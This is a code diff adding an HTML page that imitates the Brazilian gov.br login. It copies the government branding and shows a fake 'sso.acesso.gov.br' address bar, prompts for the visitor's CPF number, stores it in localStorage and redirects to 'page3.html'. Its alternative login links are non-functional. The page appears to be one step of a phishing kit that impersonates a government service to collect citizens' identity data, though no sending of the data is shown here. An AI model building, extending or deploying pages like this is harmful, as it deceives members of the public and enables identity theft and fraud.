@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>gov.br - Identificação CPF</title>
+  <link rel="stylesheet" href="css/style.css?v=2">
+  <style>
+    body {
+      background-color: white;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+    }
+
+    .page-wrapper {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background-color: white;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 20px;
+      background-color: white;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .logo-small {
+      height: 30px;
+    }
+
+    .header-icons {
+      display: flex;
+      gap: 12px;
+    }
+
+    .header-icon {
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .title-bar {
+      text-align: center;
+      padding: 16px 20px;
+      font-size: 13px;
+      color: #666;
+      letter-spacing: 0.3px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .content {
+      flex: 1;
+      padding: 28px 20px;
+      overflow-y: auto;
+    }
+
+    .form-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 20px;
+      letter-spacing: -0.3px;
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .section-icon {
+      width: 24px;
+      height: 24px;
+      background-color: #0052b3;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 14px;
+    }
+
+    .section-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .form-subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .form-input {
+      padding: 14px 16px;
+      border: 2px solid #d0d0d0;
+      border-radius: 6px;
+      font-size: 16px;
+      font-style: italic;
+      color: #999;
+      font-family: inherit;
+      transition: all 0.3s;
+      background-color: #fafafa;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: #0052b3;
+      color: #333;
+      font-style: normal;
+      background-color: white;
+      box-shadow: 0 0 0 3px rgba(0, 82, 179, 0.1);
+    }
+
+    .form-input.error {
+      border-color: #d32f2f;
+      background-color: #ffebee;
+    }
+
+    .error-message {
+      color: #d32f2f;
+      font-size: 12px;
+      display: none;
+    }
+
+    .error-message.show {
+      display: block;
+    }
+
+    .btn-continue {
+      width: 100%;
+      padding: 16px;
+      background-color: #0052b3;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: all 0.3s;
+      box-shadow: 0 2px 8px rgba(0, 82, 179, 0.3);
+    }
+
+    .btn-continue:hover:not(:disabled) {
+      background-color: #003d85;
+      box-shadow: 0 4px 16px rgba(0, 82, 179, 0.4);
+      transform: translateY(-2px);
+    }
+
+    .btn-continue:disabled {
+      background-color: #e0e0e0;
+      color: #999;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .other-options {
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 2px solid #e8e8e8;
+    }
+
+    .other-options-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 18px;
+      letter-spacing: -0.2px;
+    }
+
+    .other-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 0;
+      color: #333;
+      text-decoration: none;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s;
+      border-radius: 4px;
+    }
+
+    .other-option:hover {
+      background-color: #f5f5f5;
+      transform: translateX(4px);
+    }
+
+    .other-option-icon {
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      flex-shrink: 0;
+    }
+
+    .badge {
+      background-color: #2e7d32;
+      color: white;
+      padding: 4px 8px;
+      border-radius: 3px;
+      font-size: 10px;
+      font-weight: 700;
+      margin-left: auto;
+      letter-spacing: 0.3px;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <!-- Top Bar com Logo e Ícones -->
+    <div class="top-bar">
+      <img src="assets/Govbr.svg" alt="gov.br" class="logo-small">
+      <div class="header-icons">
+        <div class="header-icon">ℹ️</div>
+        <div class="header-icon">🔧</div>
+      </div>
+    </div>
+
+    <!-- Title Bar -->
+    <div class="title-bar">sso.acesso.gov.br</div>
+
+    <!-- Content -->
+    <div class="content">
+      <h1 class="form-title">Identifique-se no gov.br com:</h1>
+
+      <!-- Section Header -->
+      <div class="section-header">
+        <div class="section-icon">📇</div>
+        <div class="section-title">Número do CPF</div>
+      </div>
+
+      <p class="form-subtitle">
+        Digite seu CPF para criar ou acessar sua conta gov.br
+      </p>
+
+      <!-- Form Group -->
+      <div class="form-group">
+        <label class="form-label">CPF</label>
+        <input 
+          type="text" 
+          id="cpf-input" 
+          class="form-input" 
+          placeholder="Digite o seu CPF"
+          maxlength="14"
+        >
+        <div id="error-message" class="error-message"></div>
+      </div>
+
+      <!-- Continue Button -->
+      <button id="continue-button" class="btn-continue" disabled>
+        Continuar
+      </button>
+
+      <!-- Other Options -->
+      <div class="other-options">
+        <div class="other-options-title">Outras opções de identificação:</div>
+        
+        <a href="#" class="other-option">
+          <div class="other-option-icon">🏦</div>
+          <span>Login com seu banco</span>
+          <span class="badge">SUA CONTA SERÁ PRATA</span>
+        </a>
+        
+        <a href="#" class="other-option">
+          <div class="other-option-icon">📱</div>
+          <span>Seu aplicativo gov.br</span>
+        </a>
+        
+        <a href="#" class="other-option">
+          <div class="other-option-icon">🔐</div>
+          <span>Seu certificado digital</span>
+        </a>
+        
+        <a href="#" class="other-option">
+          <div class="other-option-icon">☁️</div>
+          <span>Seu certificado digital em nuvem</span>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/app.js?v=2"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const cpfInput = document.getElementById('cpf-input');
+      const continueButton = document.getElementById('continue-button');
+      const errorMessage = document.getElementById('error-message');
+      
+      if (cpfInput) {
+        cpfInput.addEventListener('input', function(e) {
+          e.target.value = formatCPF(e.target.value);
+          
+          if (errorMessage) {
+            errorMessage.classList.remove('show');
+          }
+          if (e.target.classList.contains('error')) {
+            e.target.classList.remove('error');
+          }
+          
+          const isValid = validateCPF(e.target.value);
+          if (continueButton) {
+            continueButton.disabled = !isValid;
+          }
+        });
+      }
+      
+      if (continueButton) {
+        continueButton.addEventListener('click', function(e) {
+          const cpf = cpfInput.value;
+          
+          if (!cpf || cpf.length === 0) {
+            cpfInput.classList.add('error');
+            if (errorMessage) {
+              errorMessage.textContent = 'CPF é obrigatório';
+              errorMessage.classList.add('show');
+            }
+            return false;
+          }
+          
+          if (!validateCPF(cpf)) {
+            cpfInput.classList.add('error');
+            if (errorMessage) {
+              errorMessage.textContent = 'CPF inválido';
+              errorMessage.classList.add('show');
+            }
+            return false;
+          }
+          
+          localStorage.setItem('gov_cpf', cpf);
+          window.location.href = 'page3.html';
+        });
+      }
+    });
+  </script>
+</body>
+</html>
